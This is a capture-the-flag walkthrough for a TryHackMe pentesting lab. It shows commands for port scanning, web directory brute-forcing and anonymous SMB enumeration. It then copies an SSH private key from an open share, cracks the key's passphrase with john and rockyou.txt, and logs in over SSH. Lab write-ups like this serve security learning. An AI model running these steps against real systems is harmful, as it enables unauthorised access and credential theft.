# Basic Pentesting – Full Walkthrough (TryHackMe)

## Overview
This machine focuses on fundamental penetration testing techniques commonly tested in **TryHackMe Basic Pentesting** labs. The main objectives were:
- Discover hidden web directories
- Enumerate SMB services and check for anonymous access
- Obtain credentials via SSH private key abuse
- Gain initial user access and perform basic post‑exploitation enumeration

---

## 1. Network Enumeration

The first step was to identify open ports and running services on the target machine.

```bash
nmap -sC -sV TARGET_IP
```

### Discovered Services
- SSH (22)
- HTTP (80)
- SMB (139, 445)

---

## 2. Web Enumeration – Hidden Directory Discovery (Gobuster)

TryHackMe specifically required finding **hidden directories** on the web server. For this purpose, **Gobuster** was used.

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

Gobuster successfully revealed hidden directories that were not accessible from the main webpage. This confirmed that directory enumeration was required and helped progress the challenge.

---

## 3. SMB Enumeration – Checking Anonymous Access (enum4linux)

To enumerate SMB services and check whether **anonymous login** was enabled, `enum4linux` was used:

```bash
enum4linux TARGET_IP
```

This step provided useful information such as:
- Available SMB shares
- User enumeration
- Confirmation of **anonymous SMB access**

---

## 4. Accessing SMB Shares (Anonymous Login)

After confirming anonymous access, SMB shares were listed:

```bash
smbclient -L //TARGET_IP -N
```

One of the shares allowed **anonymous login**. After connecting to it, files and directories were listed:

```bash
smbclient //TARGET_IP/SHARE_NAME -N
ls
```

Inside one of the directories, an **SSH private key (`id_rsa`)** file was discovered. The file could not be downloaded using `get`, so it was opened directly and copied manually:

```bash
cat id_rsa
```

The contents of the private key were copied and saved locally into a file named `id_rsa`. This file was later used to gain SSH access to the system.

---


## 5. SSH Private Key Discovery

An **SSH private key (`id_rsa`)** was obtained from the SMB share.

Checking the file type:

```bash
file id_rsa
```

Result:
```
OpenSSH private key
```

The file contents were unreadable, indicating that the private key was **encrypted with a passphrase**.

---

## 6. Cracking the SSH Private Key Passphrase

The encrypted private key was converted into a crackable hash using `ssh2john`:

```bash
ssh2john id_rsa > id_rsa.hash
```

The passphrase was then cracked using `john` with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

The correct passphrase was successfully recovered.

---

## 7. Gaining SSH Access

Proper permissions were applied to the private key:

```bash
chmod 600 id_rsa
```

SSH access was obtained using the decrypted private key:

```bash
ssh -i id_rsa user2@TARGET_IP
```

When prompted, the cracked passphrase was entered, resulting in successful access to the **second user account**.

Immediately after logging in, the home directory was listed:

```bash
ls
```

At this stage, the **flag file** was found directly in the user directory and successfully read.

---


